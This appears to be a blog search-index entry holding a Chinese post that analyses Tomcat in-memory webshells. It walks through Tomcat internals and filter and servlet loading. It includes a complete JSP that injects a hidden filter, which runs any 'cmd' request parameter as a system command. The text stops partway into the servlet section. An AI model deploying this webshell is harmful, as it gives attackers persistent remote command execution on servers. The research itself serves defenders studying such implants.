<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Tomcat内存马</title>
      <link href="/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<blockquote><p>浅析Tomcat内存马</p></blockquote><span id="more"></span><h2 id="Web应用"><a href="#Web应用" class="headerlink" title="Web应用"></a>Web应用</h2><h3 id="初始化流程"><a href="#初始化流程" class="headerlink" title="初始化流程"></a>初始化流程</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021120419010d17901dd228b3521a27.png" alt="image-20211202025149726" style="zoom:80%;" /><ol><li>部署描述文件中由<code>&lt;listener&gt;</code>元素标记的事件监听器会被创建和初始化，事件监听器如果实现了<code>ServletContextListener</code>接口，将会调用其实现的<code>contextInitialized()</code>方法</li><li>部署描述文件中由<code>&lt;filter&gt;</code>元素标记的过滤器会被创建和初始化，并调用其<code>init()</code>方法，每一次请求时都只调用<code>doFilter()</code>方法进行处理</li><li>部署描述文件中由<code>&lt;servlet&gt;</code>元素标记的<code>Servlet</code>会根据<code>&lt;load-on-startup&gt;</code>的权值按顺序创建和初始化，并调用其<code>init()</code>方法，<code>Servlet</code>一旦被装入到Web容器之后，一般会长久驻留，直到Web容器停止运行或重新装入<code>Servlet</code>时结束生命周期，<code>Servlet</code>在第一次访问之后都只调用<code>doGet()</code>或<code>doPost()</code>方法</li></ol><h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><h3 id="Tomcat体系结构"><a href="#Tomcat体系结构" class="headerlink" title="Tomcat体系结构"></a>Tomcat体系结构</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202112041900df05d576da5041783ccd.png" alt="image-20211201195720058" style="zoom: 50%;" /><ul><li><strong>Server</strong>：表示一个Tomcat实例（单例），即整个catalina servlet容器，主要是用来管理容器下各个Serivce组件的生命周期</li><li><strong>Service</strong>：一组提供服务、处理请求的组件，将一组Connector组件和Engine关联了起来</li><li><strong>Connector</strong>：客户端连接到Tomcat容器的服务点，它为Engine提供协议服务，并根据Engine与客户端通讯的协议类型进行隔离，如HTTP、HTTPS、AJP协议</li><li><strong>Container</strong>：Container是容器的父接口，用于封装和管理Servlet，以及处理Request请求，它包含了四大请求处理组件：Engine、Host、Context和Wrapper</li><li><strong>Engine</strong>：Service中的请求处理组件，包含了Servlet容器的核心功能，主要负责将传入请求委托给适当的Host处理</li><li><strong>Host</strong>：虚拟主机，每个Host会与某个网络域名相匹配，负责运行多个Web Application，每个Web Application对应一个Context，负责将收到的请求匹配到对应的Context，匹配的方法为“最长匹配”</li><li><strong>Context</strong>：一个Contenxt代表一个Web Application，具备了Servlet运行的基本环境</li><li><strong>Wrapper</strong>：最底层的容器，一个Wrapper代表一个Servlet，负责Servlet的装载、初始化、执行和资源回收</li></ul><h3 id="Tomcat组件关系"><a href="#Tomcat组件关系" class="headerlink" title="Tomcat组件关系"></a>Tomcat组件关系</h3><ul><li>一个Server包含一个或多个Service</li><li>一个Service包含多个Connector和一个Container</li><li>一个Container只能包含一个Engine</li><li>一个Engine包含一个或多个Host</li><li>一个Host包含一个或多个Web Application</li><li>一个Context表示一个运行着Tomcat实例的Web Application</li><li>一个Web Application包含一个或多个Wrapper</li><li>一个Wrapper表示一个Servlet</li><li>Engine、Host、Context和Wrapper是显现了Container接口的容器</li></ul><h3 id="Tomcat执行流程"><a href="#Tomcat执行流程" class="headerlink" title="Tomcat执行流程"></a>Tomcat执行流程</h3><p><strong>客户端和服务端交互过程</strong></p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20211204190156f5ecc16735b1e97e53.png" alt="image-20211201195745765" style="zoom:50%;" /><p><strong>请求数据流图</strong></p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202112041901cc740176246a7b512a0c.png" alt="image-20211201204202339" style="zoom: 67%;" /><p><strong>Pipeline调用链</strong></p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211202153946928.png" alt="image-20211202153946928" style="zoom:50%;" /><ul><li><code>Connector</code>在某个指定的端口上来监听客户端发来的请求</li><li><code>Connector</code>使用<code>ProtocolHandler</code>处理器处理收到的请求，<code>ProtocolHandler</code>处理器共有三个组件<ul><li><code>Endpoint</code>负责接受，处理<code>socket</code>网络连接（<code>Executor</code>提供多线程操作）</li><li><code>Processor</code>根据协议类型封装成<code>Request</code></li><li><code>Adapter</code>负责将封装好的<code>Request</code>交给<code>Container</code>进行处理</li></ul></li><li><code>Container</code>使用<code>Pipeline-valve</code>管道处理请求，每个 <code>Pipeline</code> 都有一个最后执行的、不可删除的 <code>BasicValve</code>，通常命名为<code>Standard(xxx)Valve</code>，如上图所示，上层容器<code>valve</code>调用下层<code>valve</code>形成链式结构<ul><li><code>EnginePipeline</code>：<code>EngineValve1</code> -&gt; … -&gt;<code>StandardEngineValve</code></li><li><code>HostPipeline</code>：<code>HostValve1</code> -&gt; … -&gt;<code>StandardHostValve</code></li><li><code>ContextPipeline</code>：<code>ContextValve1</code> -&gt; … -&gt;<code>StandardContextValve</code></li><li><code>WrapperPipeline</code>：<code>WrapperValve1</code> -&gt; … -&gt;<code>StandardWrapperValve</code></li></ul></li><li>创建<code>FilterChain</code>，如果一个<code>URL</code>对应多个<code>Filter</code>则进行链式调用</li><li>最终由<code>Servlet</code>处理请求，并将处理的结果返回给<code>Connector</code></li><li><code>Connector</code>把响应回传给客户端</li></ul><h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><p><code>StandardContext</code>是<code>Context</code>的实现类，涵盖了<code>Web Application</code>的启动流程，包括使用<code>WebResourceRoot</code>加载资源文件、利用<code>Loader</code>加载<code>class</code>，使用<code>JarScanner</code>扫描，实例化<code>Sesssion</code>管理器，初始化各种<code>Listener</code>、<code>Filter</code>和<code>Servlet</code>等功能</p><p>以下讲到的内存马都是基于修改<code>StandardContext</code>实现的，所以如何获取<code>StandardContext</code>也是内存马实现的重点之一</p><p><strong>获取方法</strong></p><p>目前<code>StandardContext</code>获取的方式有以下几种：</p><ol><li><p>从<code>request</code>对象反射出<code>ApplicationContext</code>，再反射出<code>StandardContext</code></p><pre><code class="java">ServletContext servletContext = request.getSession().getServletContext();Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);appctx.setAccessible(true);ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);stdctx.setAccessible(true);StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</code></pre></li><li><p>从<code>ThreadLocal</code>中获取<code>request</code></p><blockquote><p>Tomcat 7、8、9</p></blockquote><p>参考<strong>@threedr3am</strong>师傅的<a href="https://xz.aliyun.com/t/7388">文章</a></p></li><li><p>从<code>ContextClassLoader</code>中获取</p><blockquote><p>Tomcat 8、9</p></blockquote><pre><code class="java">org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();</code></pre></li><li><p>遍历<code>thread</code>数组获取包含<code>StandardContext</code>的类，其中<code>Acceptor</code>为全版本<code>tomcat</code>都有</p><blockquote><p>Tomcat 6、7、8、9</p></blockquote><p>参考<strong>@bitterz</strong>师傅的<a href="https://xz.aliyun.com/t/9914">文章</a>，比如下面方法就能够拿到<code>/manager</code>下的<code>StandardContext</code></p><pre><code class="java">Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);threads[3] ==&gt; Thread[ContainerBackgroundProcessor[StandardEngine[Catalina]],5,main]threads[3].target.this$0.children.values.toArray()[0].children.get(&quot;/manager&quot;)</code></pre></li></ol><h3 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h3><h4 id="FilterChain"><a href="#FilterChain" class="headerlink" title="FilterChain"></a>FilterChain</h4><p>前面提到，当<code>StandardWrapperValve</code>执行完后就会创建<code>FilterChain</code>，所以<code>FilterChain</code>的入口位于<code>org/apache/catalina/core/StandardWrapperValve.java#invoke</code>函数中</p><pre><code class="java">package org.apache.catalina.core;final class StandardWrapperValve extends ValveBase &#123;    @Override    public final void invoke(Request request, Response response)        throws IOException, ServletException &#123;        ...        MessageBytes requestPathMB = request.getRequestPathMB();        DispatcherType dispatcherType = DispatcherType.REQUEST;        if (request.getDispatcherType()==DispatcherType.ASYNC) dispatcherType = DispatcherType.ASYNC;        request.setAttribute(Globals.DISPATCHER_TYPE_ATTR,dispatcherType);        request.setAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR,                requestPathMB);        ApplicationFilterChain filterChain =                ApplicationFilterFactory.createFilterChain(request, wrapper, servlet); // ==&gt; 创建FilterChain        ...</code></pre><pre><code class="java">package org.apache.catalina.core;public final class ApplicationFilterFactory &#123;    public static ApplicationFilterChain createFilterChain(ServletRequest request,            Wrapper wrapper, Servlet servlet) &#123;        if (servlet == null)            return null;        ApplicationFilterChain filterChain = null;        if (request instanceof Request) &#123;            Request req = (Request) request;            if (Globals.IS_SECURITY_ENABLED) &#123;                filterChain = new ApplicationFilterChain();            &#125; else &#123;                filterChain = (ApplicationFilterChain) req.getFilterChain(); // ==&gt; 初始化一个空的FilterChain                if (filterChain == null) &#123;                    filterChain = new ApplicationFilterChain();                    req.setFilterChain(filterChain);                &#125;            &#125;        &#125; else &#123;            filterChain = new ApplicationFilterChain();        &#125;        filterChain.setServlet(servlet); // ==&gt; 设置Servlet        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());        StandardContext context = (StandardContext) wrapper.getParent(); // ==&gt; 获取StandardContext        FilterMap filterMaps[] = context.findFilterMaps(); // ==&gt; 获取存储了所有filter的filterMaps，filterMaps位于StandardContext的filterMaps属性中        if ((filterMaps == null) || (filterMaps.length == 0))            return filterChain;        DispatcherType dispatcher =                (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR); // ==&gt; 获取调度类型为&quot;REQUEST&quot;        String requestPath = null;        Object attribute = request.getAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR);        if (attribute != null)&#123;            requestPath = attribute.toString(); // ==&gt; 获取请求的URL路径        &#125;        String servletName = wrapper.getName(); // ==&gt; 获取Servlet的名字        for (FilterMap filterMap : filterMaps) &#123;            if (!matchDispatcher(filterMap, dispatcher)) &#123; // ==&gt; 匹配调度的指令，即&quot;REQUEST&quot;                continue;            &#125;            if (!matchFiltersURL(filterMap, requestPath)) // ==&gt; 根据Filter的URLPattern匹配请求的URL                continue;            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)                    context.findFilterConfig(filterMap.getFilterName()); // ==&gt; 初始化filterConfig，此处的filterDef封装了我们的Filter，filterConfigs以键值对的方式存储在StandardContext中            if (filterConfig == null) &#123;                continue;            &#125;            filterChain.addFilter(filterConfig); // ==&gt; 添加filterConfig到filterChain的filters数组中        &#125;        for (FilterMap filterMap : filterMaps) &#123;            if (!matchDispatcher(filterMap, dispatcher)) &#123;                continue;            &#125;            if (!matchFiltersServlet(filterMap, servletName)) // ==&gt; 匹配ServletName，但是filterMap默认的ServletName为空，所以全部跳过                continue;            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)                    context.findFilterConfig(filterMap.getFilterName());            if (filterConfig == null) &#123;                continue;            &#125;            filterChain.addFilter(filterConfig);        &#125;        return filterChain; // ==&gt; 返回FilterChain    &#125;</code></pre><p>再次回到<code>StandardWrapperValve</code>的<code>invoke()</code>函数中</p><pre><code class="java">package org.apache.catalina.core;final class StandardWrapperValve extends ValveBase &#123;    @Override    public final void invoke(Request request, Response response)        throws IOException, ServletException &#123;        ...        MessageBytes requestPathMB = request.getRequestPathMB();        DispatcherType dispatcherType = DispatcherType.REQUEST;        if (request.getDispatcherType()==DispatcherType.ASYNC) dispatcherType = DispatcherType.ASYNC;        request.setAttribute(Globals.DISPATCHER_TYPE_ATTR,dispatcherType);        request.setAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR,                requestPathMB);        ApplicationFilterChain filterChain =                ApplicationFilterFactory.createFilterChain(request, wrapper, servlet); // ==&gt; 创建FilterChain        try &#123;            if ((servlet != null) &amp;&amp; (filterChain != null)) &#123;                if (context.getSwallowOutput()) &#123;                    try &#123;                        SystemLogHandler.startCapture();                        if (request.isAsyncDispatching()) &#123;                            request.getAsyncContextInternal().doInternalDispatch();                        &#125; else &#123;                            filterChain.doFilter(request.getRequest(),                                    response.getResponse());                        &#125;                    &#125; finally &#123;                        String log = SystemLogHandler.stopCapture();                        if (log != null &amp;&amp; log.length() &gt; 0) &#123;                            context.getLogger().info(log);                        &#125;                    &#125;                &#125; else &#123;                    if (request.isAsyncDispatching()) &#123;                        request.getAsyncContextInternal().doInternalDispatch();                    &#125; else &#123;                        filterChain.doFilter                            (request.getRequest(), response.getResponse()); // ==&gt; 调用ApplicationFilterChain的doFilter()函数                    &#125;                &#125;            &#125;</code></pre><pre><code class="java">package org.apache.catalina.core;public final class ApplicationFilterChain implements FilterChain &#123;    @Override    public void doFilter(ServletRequest request, ServletResponse response)        throws IOException, ServletException &#123;        if( Globals.IS_SECURITY_ENABLED ) &#123;            final ServletRequest req = request;            final ServletResponse res = response;            try &#123;                java.security.AccessController.doPrivileged(                    new java.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;                        @Override                        public Void run()                            throws ServletException, IOException &#123;                            internalDoFilter(req,res);                            return null;                        &#125;                    &#125;                );            &#125; catch( PrivilegedActionException pe) &#123;                Exception e = pe.getException();                if (e instanceof ServletException)                    throw (ServletException) e;                else if (e instanceof IOException)                    throw (IOException) e;                else if (e instanceof RuntimeException)                    throw (RuntimeException) e;                else                    throw new ServletException(e.getMessage(), e);            &#125;        &#125; else &#123;            internalDoFilter(request,response); // ==&gt; 调用internalDoFilter函数()        &#125;    &#125;</code></pre><pre><code class="java">package org.apache.catalina.core;public final class ApplicationFilterChain implements FilterChain &#123;    private void internalDoFilter(ServletRequest request,                                  ServletResponse response)        throws IOException, ServletException &#123;        if (pos &lt; n) &#123; // ==&gt; 遍历FilterChains            ApplicationFilterConfig filterConfig = filters[pos++];            try &#123;                Filter filter = filterConfig.getFilter(); // ==&gt; 获取对应的Filter                if (request.isAsyncSupported() &amp;&amp; &quot;false&quot;.equalsIgnoreCase(                        filterConfig.getFilterDef().getAsyncSupported())) &#123;                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);                &#125;                if( Globals.IS_SECURITY_ENABLED ) &#123;                    final ServletRequest req = request;                    final ServletResponse res = response;                    Principal principal =                        ((HttpServletRequest) req).getUserPrincipal();                    Object[] args = new Object[]&#123;req, res, this&#125;;                    SecurityUtil.doAsPrivilege (&quot;doFilter&quot;, filter, classType, args, principal);                &#125; else &#123;                    filter.doFilter(request, response, this); // ==&gt; 调用对应的doFilter()函数                &#125;            &#125; catch (IOException | ServletException | RuntimeException e) &#123;                throw e;            &#125; catch (Throwable e) &#123;                e = ExceptionUtils.unwrapInvocationTargetException(e);                ExceptionUtils.handleThrowable(e);                throw new ServletException(sm.getString(&quot;filterChain.filter&quot;), e);            &#125;            return;        &#125;        try &#123;            if (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;                lastServicedRequest.set(request);                lastServicedResponse.set(response);            &#125;            if (request.isAsyncSupported() &amp;&amp; !servletSupportsAsync) &#123;                request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR,                        Boolean.FALSE);            &#125;            if ((request instanceof HttpServletRequest) &amp;&amp;                    (response instanceof HttpServletResponse) &amp;&amp;                    Globals.IS_SECURITY_ENABLED ) &#123;                final ServletRequest req = request;                final ServletResponse res = response;                Principal principal =                    ((HttpServletRequest) req).getUserPrincipal();                Object[] args = new Object[]&#123;req, res&#125;;                SecurityUtil.doAsPrivilege(&quot;service&quot;,                                           servlet,                                           classTypeUsedInService,                                           args,                                           principal);            &#125; else &#123;                servlet.service(request, response); // ==&gt; FilterChain结束后调用对应的Servlet            &#125;        &#125;    &#125;</code></pre><p><strong>总结</strong></p><p>想要注入一个<code>filter</code>内存马，核心在篡改<code>StandardContext</code>中的<code>filterMaps</code>属性来绕过<code>dispatcher</code>和<code>requestPath</code>，然后把<code>filterConfig</code>注入到<code>StandardContext</code>的<code>filterConfigs</code>属性中即可</p><p><code>filterMaps</code>需要包含对应的<code>dispatcherMapping</code>、<code>filterName</code>和<code>urlPatterns</code></p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021120419024dcd9d08efa3dfd40056.png" alt="image-20211202012812870" style="zoom:80%;" /><p><code>filterConfig</code>中的<code>filterDef</code>需要包含对应的<code>filter</code>、<code>filterClass</code>和<code>filterName</code></p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021120419024dcd9d08efa3dfd40056.png" alt="image-20211202012939483" style="zoom:80%;" /><h4 id="Filter内存马实例"><a href="#Filter内存马实例" class="headerlink" title="Filter内存马实例"></a>Filter内存马实例</h4><blockquote><p>一定要先修改filterDef，再修改filterMap，不然会抛出找不到filterName的异常</p></blockquote><pre><code class="jsp">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;java.util.Map&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;AddFilter&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;%    Field Configs = null;    Map filterConfigs;    try &#123;        // 从ServletContext中反射获取ApplicationContext和StandardContext        ServletContext servletContext = request.getSession().getServletContext();        Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);        appctx.setAccessible(true);        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);        Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);        stdctx.setAccessible(true);        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);        // 获取filterConfigs        Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);        Configs.setAccessible(true);        filterConfigs = (Map) Configs.get(standardContext);        String FilterName = &quot;CmdFilter&quot;;        if (filterConfigs.get(FilterName) == null) &#123;            Filter filter = new Filter() &#123;                @Override                public void init(FilterConfig filterConfig) &#123;&#125;                @Override                public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;                    HttpServletRequest req = (HttpServletRequest) servletRequest;                    if (req.getParameter(&quot;cmd&quot;) != null) &#123;                        InputStream in = Runtime.getRuntime().exec(req.getParameter(&quot;cmd&quot;)).getInputStream();                        Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);                        String output = s.hasNext() ? s.next() : &quot;&quot;;                        servletResponse.getWriter().write(output);                        PrintWriter out = servletResponse.getWriter();                        out.println(output);                        out.flush();                        out.close();                    &#125;                    filterChain.doFilter(servletRequest, servletResponse);                &#125;                @Override                public void destroy() &#123;&#125;            &#125;;            // 获取FilterDef并修改其filter、filterName和filterClass            Class&lt;?&gt; FilterDef = Class.forName(&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;);            Constructor declaredConstructor1 = FilterDef.getDeclaredConstructor();            org.apache.tomcat.util.descriptor.web.FilterDef filterDef = (FilterDef) declaredConstructor1.newInstance();            filterDef.setFilter(filter);            filterDef.setFilterName(FilterName);            filterDef.setFilterClass(filter.getClass().getName());            // 加入到StandardContext的FilterDef属性中            standardContext.addFilterDef(filterDef);            // 获取FilterMap并修改其URLPattern、FilterName和Dispatcher            Class&lt;?&gt; FilterMap = Class.forName(&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;);            Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();            org.apache.tomcat.util.descriptor.web.FilterMap filterMap = (FilterMap) declaredConstructor.newInstance();            filterMap.addURLPattern(&quot;/*&quot;);            filterMap.setFilterName(FilterName);            filterMap.setDispatcher(DispatcherType.REQUEST.name());            // 加入到StandardContext的filterMaps属性中            standardContext.addFilterMap(filterMap);            // 获取ApplicationFilterConfig，注入filterDef            Class&lt;?&gt; ApplicationFilterConfig = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;);            Constructor&lt;?&gt; declaredConstructor2 = ApplicationFilterConfig.getDeclaredConstructor(Context.class, FilterDef.class);            declaredConstructor2.setAccessible(true);            org.apache.catalina.core.ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor2.newInstance(standardContext, filterDef);            filterConfigs.put(FilterName, filterConfig);            response.getWriter().write(&quot;Success&quot;);        &#125;    &#125; catch (Exception e) &#123;        e.printStackTrace();    &#125;%&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="Servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h3><h4 id="loadOnStartup"><a href="#loadOnStartup" class="headerlink" title="loadOnStartup"></a>loadOnStartup</h4><p>在<code>StanderContext</code>的初始化过程中，在配置完<code>filter</code>之后就会调用<code>loadOnStartup()</code>方法来初始化<code>servlet</code></p><pre><code class="java">package org.apache.catalina.core;public class StandardContext extends ContainerBase        implements Context, NotificationEmitter &#123;    @Override    protected synchronized void startInternal() throws LifecycleException &#123;        ...            if (ok) &#123;                if (!filterStart()) &#123;                    log.error(sm.getString(&quot;standardContext.filterFail&quot;));                    ok = false;                &#125;            &#125;            if (ok) &#123;                if (!loadOnStartup(findChildren()))&#123; // ==&gt; findChildren()返回所有Servlet                    log.error(sm.getString(&quot;standardContext.servletFail&quot;));                    ok = false;                &#125;            &#125;          ...</code></pre><pre><code class="java">package org.apache.catalina.core;public abstract class ContainerBase extends LifecycleMBeanBase        implements Container &#123;    @Override    public Container[] findChildren() &#123;        synchronized (children) &#123; // ==&gt; Children是一个HashMap类型，存储着各个StandardWrapper            Container results[] = new Container[children.size()];            return children.values().toArray(results); // ==&gt; 将Wrapper转化为Container        &#125;    &#125;</code></pre><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021120419020d0e5454e24738554553.png" alt="image-20211202123329058" style="zoom:80%;" /><pre><code class="java">package org.apache.catalina.core;public class StandardContext extends ContainerBase        implements Context, NotificationEmitter &#123;    public boolean loadOnStartup(Container children[]) &#123;        TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = new TreeMap&lt;&gt;();        for (Container child : children) &#123;            Wrapper wrapper = (Wrapper) child; // ==&gt; 将Container转化为Wrapper（略显多余的一个步骤）            int loadOnStartup = wrapper.getLoadOnStartup();            if (loadOnStartup &lt; 0) &#123; // 令loadOnStartup大于0                continue;            &#125;            Integer key = Integer.valueOf(loadOnStartup);            ArrayList&lt;Wrapper&gt; list = map.get(key);            if (list == null) &#123;                list = new ArrayList&lt;&gt;();                map.put(key, list);            &#125;            list.add(wrapper); // ==&gt; 将wrapper装入list中        &#125;        // Load the collected &quot;load on startup&quot; servlets        for (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;            for (Wrapper wrapper : list) &#123;                try &#123;                    wrapper.load(); // 加载list中的Servlet                &#125; catch (ServletException e) &#123;                    getLogger().error(sm.getString(&quot;standardContext.loadOnStartup.loadException&quot;,                          getName(), wrapper.getName()), StandardWrapper.getRootCause(e));                    if(getComputedFailCtxIfServletStartFails()) &#123;                        return false;                    &#125;                &#125;            &#125;        &#125;        return true;    &#125;</code></pre><p>所以这里的重点是修改<code>children</code>属性加入我们的<code>wrapper</code>，向上追溯如何生成<code>children</code>，我们可以来到解析<code>web.xml</code>的函数</p><pre><code class="java">package org.apache.catalina.startup;public class ContextConfig implements LifecycleListener &#123;    private void configureContext(WebXml webxml) &#123;        ...        for (ServletDef servlet : webxml.getServlets().values()) &#123; // 搜索web.xml中的servlet            Wrapper wrapper = context.createWrapper(); // 生成新的wrapper            if (servlet.getLoadOnStartup() != null) &#123;                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue()); // 设置loadOnStartup            &#125;            if (servlet.getEnabled() != null) &#123;                wrapper.setEnabled(servlet.getEnabled().booleanValue());            &#125;            wrapper.setName(servlet.getServletName()); // 设置servletName            Map&lt;String,String&gt; params = servlet.getParameterMap();            for (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;                wrapper.addInitParameter(entry.getKey(), entry.getValue());            &#125;            wrapper.setRunAs(servlet.getRunAs());            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();            for (SecurityRoleRef roleRef : roleRefs) &#123;                wrapper.addSecurityReference(                        roleRef.getName(), roleRef.getLink());            &#125;            wrapper.setServletClass(servlet.getServletClass());            MultipartDef multipartdef = servlet.getMultipartDef();            if (multipartdef != null) &#123;                long maxFileSize = -1;                long maxRequestSize = -1;                int fileSizeThreshold = 0;                if(null != multipartdef.getMaxFileSize()) &#123;                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());                &#125;                if(null != multipartdef.getMaxRequestSize()) &#123;                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());                &#125;                if(null != multipartdef.getFileSizeThreshold()) &#123;                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());                &#125;                wrapper.setMultipartConfigElement(new MultipartConfigElement(                        multipartdef.getLocation(),                        maxFileSize,                        maxRequestSize,                        fileSizeThreshold));            &#125;            if (servlet.getAsyncSupported() != null) &#123;                wrapper.setAsyncSupported(                        servlet.getAsyncSupported().booleanValue());            &#125;            wrapper.setOverridable(servlet.isOverridable());            context.addChild(wrapper); // ==&gt; 向context新的Child        &#125;        ...</code></pre><p><code>addChild()</code>方法会调用父类的<code>addChildInternal()</code>方法</p><pre><code class="java">package org.apache.catalina.core;public abstract class ContainerBase extends LifecycleMBeanBase        implements Container &#123;    private void addChildInternal(Container child) &#123;        if( log.isDebugEnabled() )            log.debug(&quot;Add child &quot; + child + &quot; &quot; + this);        synchronized(children) &#123;            if (children.get(child.getName()) != null)                throw new IllegalArgumentException(&quot;addChild:  Child name &#39;&quot; +                                                   child.getName() +                                                   &quot;&#39; is not unique&quot;);            child.setParent(this);            children.put(child.getName(), child); // 向children属性添加新的wrapper        &#125;        try &#123;            if ((getState().isAvailable() ||                    LifecycleState.STARTING_PREP.equals(getState())) &amp;&amp;                    startChildren) &#123;                child.start();            &#125;        &#125; catch (LifecycleException e) &#123;            log.error(&quot;ContainerBase.addChild: start: &quot;, e);            throw new IllegalStateException(&quot;ContainerBase.addChild: start: &quot; + e);        &#125; finally &#123;            fireContainerEvent(ADD_CHILD_EVENT, child);        &#125;    &#125;</code></pre><p>同时需要注意在解析<code>web.xml</code>时，还会将解析到<code>WebServlet</code>添加到<code>context</code>的<code>servletMappingNames</code>属性中，来添加<code>URL</code>匹配规则</p><pre><code class="java">package org.apache.catalina.startup;public class ContextConfig implements LifecycleListener &#123;    protected void processClass(WebXml fragment, JavaClass clazz) &#123;        AnnotationEntry[] annotationsEntries = clazz.getAnnotationEntries();        if (annotationsEntries != null) &#123;            String className = clazz.getClassName();            for (AnnotationEntry ae : annotationsEntries) &#123;                String type = ae.getAnnotationType();                if (&quot;Ljavax/servlet/annotation/WebServlet;&quot;.equals(type)) &#123;                    processAnnotationWebServlet(className, ae, fragment); // 处理解析到的WebServlet                &#125;else if (&quot;Ljavax/servlet/annotation/WebFilter;&quot;.equals(type)) &#123;                    processAnnotationWebFilter(className, ae, fragment);                &#125;else if (&quot;Ljavax/servlet/annotation/WebListener;&quot;.equals(type)) &#123;                    fragment.addListener(className);                &#125; else &#123;                    // Unknown annotation - ignore                &#125;            &#125;        &#125;    &#125;</code></pre><pre><code class="java">package org.apache.catalina.startup;public class ContextConfig implements LifecycleListener &#123;    package org.apache.catalina.startup;protected void processAnnotationWebServlet(String className,            AnnotationEntry ae, WebXml fragment) &#123;        ...        if (urlPatterns != null) &#123;            if (!fragment.getServletMappings().containsValue(servletName)) &#123;                for (String urlPattern : urlPatterns) &#123;                    fragment.addServletMapping(urlPattern, servletName); // 添加servlet映射                &#125;            &#125;        &#125;        ...</code></pre><pre><code class="java">package org.apache.tomcat.util.descriptor.web;public class WebXml extends XmlEncodingBase implements DocumentProperties.Encoding,    public void addServletMappingDecoded(String urlPattern, String servletName) &#123;        String oldServletName = servletMappings.put(urlPattern, servletName);        if (oldServletName != null) &#123;            throw new IllegalArgumentException(sm.getString(                    &quot;webXml.duplicateServletMapping&quot;, oldServletName,                    servletName, urlPattern));        &#125;        servletMappingNames.add(servletName); // 添加servlet映射    